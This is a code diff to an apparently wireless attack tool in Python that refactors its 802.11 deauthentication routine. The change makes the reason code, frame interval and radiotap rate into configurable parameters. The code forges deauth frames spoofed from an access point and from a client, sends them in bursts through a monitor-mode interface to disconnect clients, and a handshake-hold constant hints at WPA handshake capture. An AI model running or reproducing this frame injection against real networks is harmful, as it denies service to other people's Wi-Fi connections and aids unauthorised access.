@@ -29,6 +29,14 @@ HANDSHAKE_HOLD = 3.0
 DEAUTH_COUNT = 64
 DEAUTH_INTERVAL = 0.005
 DEAUTH_RATE = 2
+DEAUTH_REASON = 7
+
+DEAUTH_DEFAULTS = {
+    "count": DEAUTH_COUNT,      # frames per direction
+    "reason": DEAUTH_REASON,    # 802.11 deauth reason code (7 = class 3 frame)
+    "interval": DEAUTH_INTERVAL,  # seconds between frames
+    "rate": DEAUTH_RATE,        # radiotap Rate (2 = 1 Mbps)
+}
 
 _lock = threading.Lock()
 _mode_lock = threading.RLock()
@@ -943,19 +951,21 @@ def wait_iface_released(iface, timeout=6.0):
     return _iface_type(iface) != "monitor"
 
 
-def _send_deauth(iface, addr1, addr2, addr3, count, reason):
+def _send_deauth(iface, addr1, addr2, addr3, count, reason,
+                 interval=DEAUTH_INTERVAL, rate=DEAUTH_RATE):
     # aircrack-ng style: prepend a 12-byte radiotap with RATE + TXFLAGS
     # (NOACK|NOSEQ). An empty radiotap is rejected on some drivers.
     frame = (
-        RadioTap(present="Rate+TXFlags", Rate=DEAUTH_RATE, TXFlags=0x0018)
+        RadioTap(present="Rate+TXFlags", Rate=rate, TXFlags=0x0018)
         / Dot11(type=0, subtype=12, addr1=addr1, addr2=addr2, addr3=addr3)
         / Dot11Deauth(reason=reason)
     )
-    sendp(frame, iface=iface, count=count, inter=DEAUTH_INTERVAL, verbose=0)
+    sendp(frame, iface=iface, count=count, inter=interval, verbose=0)
     return count
 
 
-def deauth(bssid, client=None, iface=None, count=DEAUTH_COUNT, reason=7):
+def deauth(bssid, client=None, iface=None, count=DEAUTH_COUNT,
+           reason=DEAUTH_REASON, interval=DEAUTH_INTERVAL, rate=DEAUTH_RATE):
     """Send a burst of deauthentication frames from an AP to a client.
 
     Linux only. Works whether or not the monitor service is running: if the
@@ -995,9 +1005,11 @@ def deauth(bssid, client=None, iface=None, count=DEAUTH_COUNT, reason=7):
     try:
         _set_channel(iface, chan)
         time.sleep(0.15)
-        sent += _send_deauth(iface, dst, bssid, bssid, count, reason)
+        sent += _send_deauth(iface, dst, bssid, bssid, count, reason,
+                             interval, rate)
         if dst != _BROADCAST:
-            sent += _send_deauth(iface, bssid, dst, bssid, count, reason)
+            sent += _send_deauth(iface, bssid, dst, bssid, count, reason,
+                                 interval, rate)
     except Exception as e:
         return False, f"Deauth failed: {e}"
     finally:
